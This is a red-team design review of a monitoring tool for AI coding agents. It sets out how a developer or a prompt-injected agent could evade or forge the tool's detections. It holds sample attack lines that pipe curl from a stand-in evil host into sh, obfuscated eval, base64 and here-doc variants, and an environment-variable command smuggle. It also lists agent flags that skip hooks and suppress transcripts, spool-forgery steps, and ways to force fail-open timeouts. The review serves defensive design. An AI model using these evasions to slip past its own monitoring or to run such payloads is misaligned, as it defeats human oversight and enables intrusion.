> **Historical design record.** Red-team review of design v0, evasion lens (an attacker controlling the agent's context, or the developer; A1, A3, A5, A6, A9, A11, A27, A28).
>
> - Written on 2026-11-11, during design (the file was last modified 2026-11-11 17:21 UTC on the build machine; it says "Date 2026-11-11").
> - Written under the working name **spoor** (binary `spoor`, rule ids `SPR-...`, osquery tables `spoor_*`, environment prefix `SPOOR_`). The project was renamed hawkbell on 2026-11-12 (commit d261f98), and those became `hawkbell`, `HB-...`, `hawkbell_*` and `HAWKBELL_`.
> - Findings, numbers, plans and file names describe the design, the prototypes and the sources as they were then, not the release. For what the release does, read [docs/ASSUMPTIONS.md](../docs/ASSUMPTIONS.md) and [docs/LIMITATIONS.md](../docs/LIMITATIONS.md).
> - Local paths (`/home/user/...`, `/root/...`, `/tmp/claude-0/...`, `$S/...` for the session scratch directory, and work-directory variables the text defines) name directories on the build machine, a Linux sandbox VM. The scripts, outputs and downloaded sources in them are not in this repository.
> - Redactions: none.
> - Below the line the text is the original, unchanged except for the redactions listed. Other records cite these files by line number; such a number counts from the original's first line, which is line 12 of this file.

---

# Red-team notes — lens: EVASION (attacker controls agent context OR is the developer; user-level, not root)
Design under attack: scratchpad/design/v0.md. Assigned: A1, A3, A5, A6, A9, A11, A27, A28.
Date 2026-11-11. All experiments run in the sandbox described in ENV.md.

## Experiment E1 — the daemonless spool is a forgery/poisoning channel into the SIEM (A28, A27, A6)
Design §7/§6/A28: in daemonless mode the hook "appends to a per-user spool file" that is user-writable; "Fluent Bit ships within seconds"; A28 calls this "an acceptable integrity trade-off." The stated risk is a deletion race. The real risk is forgery: the spool is unauthenticated, so any process with the user's uid (the developer, or a prompt-injected agent tool) can APPEND arbitrary NDJSON that is indistinguishable from genuine sensor output.

Setup: rt-evasion/spool/activity-000001.ndjson with 1 genuine line + 2 attacker-appended lines:
 - a `detection` record for the real session marked `"disposition":"cleared","note":"benign - approved by security"` (buries a true alert)
 - an `activity` record attributed to a DIFFERENT user/session (`user:bob`, `session:S-victim`) carrying `curl http://evil.example/x | sh` (frames another user / feeds the correlator false input)
Fluent Bit 5.2.0 (official image), tail input with `db` + json parser, stdout json_lines (rt-evasion/fb/fb.yaml).

Result (rt-evasion/fb_out.log): Fluent Bit shipped all three records verbatim. Forged fields present downstream:
  "disposition":"cleared"  "note":"benign - approved by security"  "name":"bob"  "id":"S-victim"  "command":"curl http://evil.example/x | sh"
There is no per-line signature, MAC, or sequence the SIEM can use to tell the genuine line from the two forged ones. A per-host monotonic `seq` (design §9) does not help: the attacker writes the seq field too, and in daemonless mode each user's hook is the only writer of its own spool so there is no independent counter.

Consequence: an attacker can (a) inject "cleared"/benign detections to suppress real ones, (b) attribute fabricated malicious activity to another user (false alarm / framing), (c) flood the activity stream to drown real detections and raise SIEM cost. A28 is broken: user-writable event files are not merely a deletion trade-off, they are a write-forgery surface on the detection pipeline.
Min change: in daemonless mode write to an append-only, per-line-authenticated log (hash chain seeded by a key the user cannot read, e.g. a root-delivered HMAC key held only by a resident root daemon; without a daemon there is no key, so daemonless output must be labelled `source=unverified` and never drive detections or "cleared" dispositions). Real integrity requires a root-owned writer (daemon/extension); say so.

## Experiment E2 — shell canonicalizer on a POSIX AST is defeated by runtime assembly and cross-language one-liners (A9)
Design §5/A9/A35: features come from "shell AST via mvdan.cc/sh" producing commands[], pipes-to-interpreter, decoded base64, URLs/hosts. Built a canonicalizer in that exact spirit (rt-evasion/canon/canon.go) using mvdan.cc/sh v3.14.1 (the library the design names): parse, walk CallExprs, collect first word = commands[], flag interpreter words, regex URLs over source.

Payloads and what the static canonicalizer sees (go run output captured):
| payload | commands[] | pipeToInterp | dangerous host visible |
|---|---|---|---|
| curl http://evil.example/x \| sh (baseline) | [curl sh] | true | YES |
| a=cur;b=l;p=htt;q=p://evil...; eval "${a}${b} ${p}${q} \| sh" | [eval] | false | NO |
| python3 -c "...urlopen('http://evil.example/x')..." | [python3] | true | YES* |
| node -e "fetch('http://evil.example/x')...then(eval)" | [node] | true | YES* |
| bash -c "$(printf aHR0cDov...| base64 -d)" | [bash printf base64] | true | NO |
| python3 <<'PY' os.system(chr(99)+chr(117)+chr(114)+chr(108)) PY | [python3] | true | NO |
| GIT_SSH_COMMAND='curl http://evil.example/x|sh' git fetch | [git] | false | YES (as literal), but attributed to `git` |
| ./build-helper.sh  (content written earlier by the agent's Write tool) | [./build-helper.sh] | false | NO |

* The URL was "visible" ONLY because a dumb regex matched a literal in the source; the AST itself stops at `python3`/`node` and never parses the `-c`/`-e` string. Assemble the host at runtime ('ht'+'tp://'+h) and the URL literal disappears, exactly as in the eval/base64/here-doc rows.

Findings: eval-of-runtime-assembled strings, interpreter one-liners that hide logic in another language, here-docs built from char codes, fetched/decoded base64, and write-then-run (dangerous bytes are in a PRIOR Write event; the shell sees only `./build-helper.sh`) all defeat a static shell canonicalizer. The design's own threat corpus concedes this: R34 requires "a real shell parser" for env-prefix sinks, R35 lists interpreter one-liners re-running denied binaries, R48 covers interpreter-in-extracted-dir — and none of these recover the content that only exists at runtime. A9 is broken for a motivated evader. The honest boundary: these are fundamentally undetectable from the hook command string (or transcript) alone; catching them needs syscall/network observation (eBPF/ES/ETW), which is root-only and off-by-default (see A5).
Min change: downgrade A9 to "raises cost for careless/unmodified abuse." Treat any `eval`, interpreter `-c/-e/-`, here-doc-to-interpreter, or exec-of-a-just-written-file as an explicit `opaque_exec` FEATURE that itself scores/escalates, rather than trying to see inside it. Correlate `file_write(path=X)` then `exec(X)` across two events. State that content hidden behind runtime assembly needs the tier-2 kernel sensor.

## A6 — cross-surface disagreement is attacker-controllable in BOTH directions (broken)
The correlator (design §3) emits detections when surfaces disagree: transcript-without-hooks = bypass; process-without-hooks/transcript = blind agent; etc. Two independent breaks:
1. Suppress every surface at once. A developer or injection picks a hook-free invocation (claude --bare sets CLAUDE_CODE_SIMPLE and skips hook discovery; codex --dangerously-bypass-hook-trust; gemini hooksConfig.enabled:false — all VERIFIED in agent-surfaces-a §9) AND suppresses the transcript (--no-session-persistence / CLAUDE_CODE_SKIP_PROMPT_HISTORY; CODEX exec --ephemeral — VERIFIED) AND relocates config (CLAUDE_CONFIG_DIR/CODEX_HOME). Now there is no hook and no transcript. The only remaining rule is "process with neither" — but that fires only if the process monitor IDENTIFIES the process as an agent, and env-scrub + rename + relocated config defeat identification (os-telemetry §8). Net: no detection.
2. Forge a surface to raise FALSE alarms on others. Because the transcript JSONL and the spool are user-writable, a user can WRITE a transcript (or spool line) containing tool calls that never ran and never had a hook → the correlator reports "transcript shows tool calls hooks never reported (hook bypass)" for activity that did not happen, optionally attributed to another session/user (E1). At fleet scale this is a false-positive generator and an analyst DoS, and it lets a real attacker hide a true bypass inside a flood of fake ones.
A6 broken: disagreement is neither reliable (can be driven to zero) nor low-FP (can be driven arbitrarily high) because all three surfaces are user-writable and none is authenticated.
Min change: the correlator may only treat disagreement as signal when at least one surface is an independent, attacker-unwritable observation (root daemon's own process/exec events, or a signed hook record). Transcript-only and spool-only "bypass" findings must be severity-capped and rate-limited, and never attributed across users.

## A11 — public deterministic rules evaluated on the attacker's endpoint are a speed bump, not a control (weakened→broken)
Rules + packs are public YAML, shipped signed (A33). In daemonless mode the rule engine runs IN-PROCESS in the hook, as the user. So the adversary: (a) reads the exact predicates and crafts payloads that miss them (E2 is a worked example); (b) in daemonless mode can read/replace the user-readable pack or state file, or simply not call the hook (hook-free path); (c) cannot be "caught lying" by the same endpoint whose rules it just read. Deterministic on-endpoint detection genuinely catches unmodified worms/infostealers and careless behavior (the threats corpus S1-S12 are real against non-adaptive actors), but it is not a boundary against a targeted evader on a machine they control.
Min change: state the trust boundary explicitly. The authoritative detector is the SIEM/Fleet side consuming authenticated events; endpoint rules are best-effort enrichment and guard-mode is a convenience, not a security control. Never market guard-mode blocking as prevention.

## A27 + A12 — unauthenticated local ingress + DoS the hook path = fail-open bypass (broken)
- Socket (daemon mode): design relies on SO_PEERCRED to "verify the caller's parent is a known agent." But a hook is ALWAYS spawned BY the agent, so parent==agent is true for every legitimate caller and for anyone who spawns the agent binary; and SO_PEERCRED authenticates the UID, not the CONTENT — a local process can connect and send forged event JSON (same forgery as E1). The socket is a second unauthenticated ingress.
- Hook stdin is attacker-influenced (A27 admits it): a huge or deeply-nested tool_input, or a slow/locked spool (fill the disk, hold the lock, make the spool path a FIFO), stalls the hook. In observe mode this silently drops events (a gap, caught only if the heartbeat notices). In guard mode (A12) a stalled hook hits the agent's timeout, and timeouts fail OPEN almost everywhere — Copilot ALWAYS fails open on timeout even for policy hooks, Claude fails open unless onFailure:block (v2.1.295+), Codex inferred fail-open (agent-surfaces-a §1). So an attacker converts guard-mode "block" into "allow" by making the hook slow. A12's "fail-open default, low latency" is the vulnerability.
A27 broken; A12 unsafe as a control.
Min change: guard decisions must come from a resident root daemon with a hard sub-second timeout and a fail-CLOSED mode the attacker cannot convert by stalling (the spool write must be off the decision path, bounded input size, non-blocking append or drop-to-daemon). Document that any guard mode built on a user-spawned, fail-open hook is advisory only.

## A1 — "managed hooks for all five, one binary serves all" overstated for evasion purposes (weakened)
VERIFIED (agent-surfaces-a): Cursor facts are UNVERIFIED (cursor.com unreachable; only snyk guard.py code). Wire contracts differ materially (Copilot: no transcript_path, no permission_mode, dual camelCase/snake_case, HTTPS-only http hooks; Gemini: different events/env, weaker managed tier overridable by GEMINI_CLI_SYSTEM_SETTINGS_PATH env). One binary CAN serve all at the process level, but "behave as documented" hides: every agent has a documented hook-free path, and timeouts fail open. So managed hooks are not a tamper-proof real-time surface against someone who controls the invocation.
Min change: scope A1 to "managed hooks are the best-effort real-time surface; completeness is never assumed." Treat Gemini's env-overridable system-settings path and Cursor's unknowns as explicit coverage-gap findings, not covered surfaces.

## A5 — user-space polling process monitor sees almost none of the evasive short-lived exec (weakened)
os-telemetry §1 (measured here): 1 s poll captures 1% of /bin/true, 7% of 100 ms processes; even 250 ms poll misses /bin/true entirely. The evasive commands (curl, base64, a one-shot python -c, cp of a secret) are exactly these sub-second execs. The design delegates "short-lived exec ground truth to osquery evented tables," but those need root AND flags off-by-default AND conflict with auditd; BPF tables are DEPRECATED (removal in osquery 6.0.0); ES tables need Full Disk Access (os-telemetry §4). On a developer's own machine (no osquery evented config — the common case and the attacker's case) the process surface provides ~0 corroboration for the short-lived evasive commands.
Min change: state that the process surface corroborates only long-lived agent ROOTS, not the tool execs; cross-surface exec corroboration requires a tier-2 kernel sensor (eBPF/ES/ETW) and is absent by default. Do not let A6's "process-without-hooks" rule imply exec-level coverage.

## A3 — hooks not guaranteed in headless/CI, which is where risk concentrates (weakened)
Claude -p/SDK run hooks and write transcripts UNLESS --bare/--no-session-persistence; whether managed hooks load under --bare "was not confirmed" (agent-surfaces-a §9). Codex `exec` hook parity is UNVERIFIED. CI runners are ephemeral and frequently lack any managed-config delivery, and bypass-mode agents in CI/devcontainers are explicitly benign baseline (threats §6) — so the highest-risk execution (headless + bypass) is both least likely to be hooked and most alert-fatiguing.
Min change: require a positive "managed hook loaded" heartbeat per session (a SessionStart hook that reports itself); absence in a session the process/transcript surface saw is the detection. Confirm --bare managed-hook behavior before shipping A3 claims; treat CI as a distinct coverage domain needing in-image install.

## Managed-hook integrity: FIM misses policy shadowing and down-sensor edits (weakened, A1/A27)
Drift detection watches the managed hook FILE. But Claude managedSourcesBehavior defaults to first-wins, so a server-managed (claude.ai console) policy silently SHADOWS the Fleet-deployed file with no file change (agent-surfaces-a §2/§9) — invisible to FIM. And plain-file managed configs (Linux /etc, macOS/Windows files; CVE-2026-35603 world-writable managed config, threats R52) can be edited by a user if perms are wrong, and in daemonless mode there is no resident watcher to notice until the next scan. 
Min change: verify EFFECTIVE managed config (what the agent actually loaded — e.g. Claude's `managed_settings_resolved` OTel event / a probe), not just the file on disk; alert when the effective hook set lacks the spoor entry regardless of file contents; require a root-owned resident watcher for real-time tamper detection.

## Fundamentally undetectable without a kernel sensor (state honestly in the design)
From E2 + os-telemetry §8: eval/runtime-assembled commands; interpreter one-liners; here-doc-from-char-codes; fetched/decoded payloads; write-file-then-exec split across tool events; env-scrubbed + renamed + relocated hook-free agent; in-memory-only exfil with no child process. None are visible from the hook command string or the transcript. They require syscall+network observation (eBPF CO-RE / ES / ETW), which is root, off-by-default, and partly deprecated. The design should carry an explicit "not covered by the three user-space surfaces" list rather than implying coverage.
